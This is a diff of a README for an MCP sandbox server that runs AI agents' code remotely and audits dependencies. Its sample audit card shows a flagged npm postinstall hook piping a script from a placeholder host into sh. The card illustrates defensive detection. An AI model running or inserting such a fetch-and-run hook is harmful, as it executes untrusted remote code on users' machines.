@@ -38,7 +38,7 @@ flowchart LR
     Airgap -->|"Compact Markdown Status Card"| Agent
 ```
 
-Only files the agent passes explicitly are uploaded; the server never reads your working tree on its own. Sandbox output is redacted before it reaches the agent, and every sandbox and template is deleted after the run. Details: [architecture](docs/architecture.md) and [threat model](docs/security-model.md).
+Only files the agent passes explicitly are uploaded; the server never reads your working tree on its own. Sandbox output is redacted before it reaches the agent, and every sandbox is deleted after the run. The image template stays on GMI Cloud so later runs with the same image and instance type skip the build. Details: [architecture](docs/architecture.md) and [threat model](docs/security-model.md).
 
 ## Why airgap?
 
@@ -46,7 +46,7 @@ Only files the agent passes explicitly are uploaded; the server never reads your
 | --- | --- | --- | --- |
 | Host contamination risk | High | Medium (shared kernel, mounted volumes) | None from executed code; it runs remotely |
 | Needs local Docker daemon or VMs | No | Yes | No |
-| Startup overhead | None | Local image pull and build | Remote provisioning; no local build (a new template can take minutes) |
+| Startup overhead | None | Local image pull and build | Remote provisioning; no local build (the first run per image builds a template, which can take minutes; later runs reuse it) |
 | Pre-execution dependency audit | None | None | `airgap_audit_supply` |
 | Secret scrubbing in logs | None | None | Automatic on sandbox output; `airgap_redact_secrets` for any text |
 | Prompt-injection defense | None | None | Model-assisted `airgap_scan_injection` |
@@ -79,7 +79,7 @@ airgap setup --cursor   # one editor only
 airgap setup --rules-only --yes   # agent routing rules only
 ```
 
-Setup registers the server for Claude Code, Cursor, VS Code and Factory Droid, and adds a managed routing-rule block to `.cursorrules`, `CLAUDE.md` and `AGENTS.md`. For Claude Code it also adds `mcp__airgap__*` to `permissions.allow`, so airgap tools run without a prompt on every call. GMI keys are written only to user-level configs (`~/.claude.json`, `~/.cursor/mcp.json`, `~/.factory/mcp.json`). Workspace files such as `.mcp.json`, `.cursor/mcp.json`, `.vscode/mcp.json` and `.factory/mcp.json` never store credentials, and setup removes keys it finds there. Set `GMI_AGENTBOX_API_KEY` and `GMI_MAAS_API_KEY` first (see [.env.example](.env.example)); local scanners work without them.
+Setup registers the server for Claude Code, Cursor, VS Code and Factory Droid, and adds a managed routing-rule block to `.cursorrules`, `CLAUDE.md` and `AGENTS.md`. For Claude Code it adds `mcp__airgap__*` to `permissions.allow` without changing `permissions.defaultMode`, so airgap tools run without prompts while host tools (`Bash`, `Write`, `Edit`) keep their existing confirmation gates (pass `--claude-bypass-permissions` only if you explicitly want to disable all Claude Code tool prompts; see [setup](docs/setup.md#claude-code-permissions)). GMI keys are written only to user-level configs (`~/.claude.json`, `~/.cursor/mcp.json`, `~/.factory/mcp.json`). Workspace files such as `.mcp.json`, `.cursor/mcp.json`, `.vscode/mcp.json` and `.factory/mcp.json` never store credentials, and setup removes keys it finds there. Set `GMI_AGENTBOX_API_KEY` and `GMI_MAAS_API_KEY` first (see [.env.example](.env.example)); local scanners work without them.
 
 **3. Check health.**
 
@@ -102,16 +102,19 @@ Reload your editor and prompt normally. The server instructions and routing rule
 
 Routing rules guide tool choice; they cannot enforce it. Adding this server does not disable the agent's own terminal tools, so configure client permissions if all execution must go through airgap.
 
-Each tool returns a compact Markdown card for the agent plus the full JSON as `structuredContent`. These two cards are real output from the release binary:
+Sandbox, patch verification and supply-chain tools return a box-drawn terminal card for the agent; secret redaction and injection scans return a compact Markdown card. Every tool also returns the full JSON as `structuredContent`. These two cards are real output from the release binary:
 
-```markdown
-🛡️ **Airgap Supply-Chain Audit** · ⏱️ **5ms**
-🚨 **Risk Level: HIGH** (2 flagged items)
-
-- npm script postinstall: curl -s https://example.invalid/x.sh | sh
-- dependencies/left-pad: remote or local dependency requires review
-
-🔒 *Manifest heuristics evaluated. Local host protected.*
+```text
+╭─ 🛡️  AIRGAP SUPPLY-CHAIN AUDIT ──────────────────────────────────────────────────────╮
+│  RISK      🚨 HIGH                                   DURATION   4ms                  │
+│  FLAGGED   2 items                                   SCOPE      Manifest heuristics  │
+├──────────────────────────────────────────────────────────────────────────────────────┤
+│  FLAGGED COMMANDS                                                                    │
+│  • npm script postinstall: curl -s https://example.invalid/x.sh | sh                 │
+│  • dependencies/left-pad: remote or local dependency requires review                 │
+├──────────────────────────────────────────────────────────────────────────────────────┤
+│  🔒 Manifest heuristics evaluated. Local host protected.                             │
+╰──────────────────────────────────────────────────────────────────────────────────────╯
 ```
 
 ```markdown
@@ -123,21 +126,48 @@ Each tool returns a compact Markdown card for the agent plus the full JSON as `s
 > max_tokens = 4096
 ```
 
-A sandbox card has the same shape. Its duration includes remote provisioning, so expect seconds rather than milliseconds (the value below is illustrative):
+Sandbox and verification cards have the same frame. Their duration includes remote provisioning, so expect seconds rather than milliseconds (the values below are illustrative):
 
-````markdown
-🛡️ **Airgap Sandbox** · `docker.io/library/rust:1-bookworm` · ⏱️ **41870ms**
-✅ **Status: PASSED** (Exit Code: 0)
-
+```text
+╭─ 🛡️  AIRGAP SANDBOX EXECUTION ───────────────────────────────────────────────────────╮
+│  STATUS    ✅ PASSED                                 EXIT CODE  0                    │
+│  IMAGE     docker.io/library/rust:1-bookworm         DURATION   41870ms              │
+│  COMPUTE   gmi.sandbox.medium                        SANDBOX    100% Host Guarded    │
+├──────────────────────────────────────────────────────────────────────────────────────┤
+│  OUTPUT                                                                              │
+│  running 1 test                                                                      │
+│  test arithmetic ... ok                                                              │
+│                                                                                      │
+│  test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out          │
+├──────────────────────────────────────────────────────────────────────────────────────┤
+│  🔒 Host Protected: Executed inside isolated GMI AgentBox MicroVM. Zero local        │
+│  modifications.                                                                      │
+╰──────────────────────────────────────────────────────────────────────────────────────╯
 ```
-running 1 test
-test arithmetic ... ok
 
-test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out
+```text
+╭─ 🛡️  AIRGAP REMOTE PATCH VERIFICATION ───────────────────────────────────────────────╮
+│  VERDICT   ❌ UNVERIFIED                             DURATION   38210ms              │
+│  STATUS    46 passed · 2 failed                      COMPUTE    gmi.sandbox.medium   │
+│  IMAGE     docker.io/library/node:20-bookworm        SANDBOX    100% Host Guarded    │
+├──────────────────────────────────────────────────────────────────────────────────────┤
+│  TEST SUITE METRICS                                                                  │
+│  Pass Rate: 96% [█████████████████████████████░] 46/48                               │
+├──────────────────────────────────────────────────────────────────────────────────────┤
+│  FAILURE REASONS                                                                     │
+│  • Patch apply or test command failed (exit code 1).                                 │
+│  • 2 test(s) failed.                                                                 │
+├──────────────────────────────────────────────────────────────────────────────────────┤
+│  OUTPUT (last 20 lines)                                                              │
+│    ✘ parser › rejects empty input                                                    │
+│    ✘ parser › keeps trailing newline                                                 │
+│    ─                                                                                 │
+│    2 tests failed                                                                    │
+├──────────────────────────────────────────────────────────────────────────────────────┤
+│  🔒 Zero Host Contamination: Clean base snapshot verified in disposable cloud        │
+│  sandbox.                                                                            │
+╰──────────────────────────────────────────────────────────────────────────────────────╯
 ```
-
-🔒 *Host Protected: Executed inside isolated GMI AgentBox MicroVM. Zero local modifications.*
-````
 
 ## Tools
 
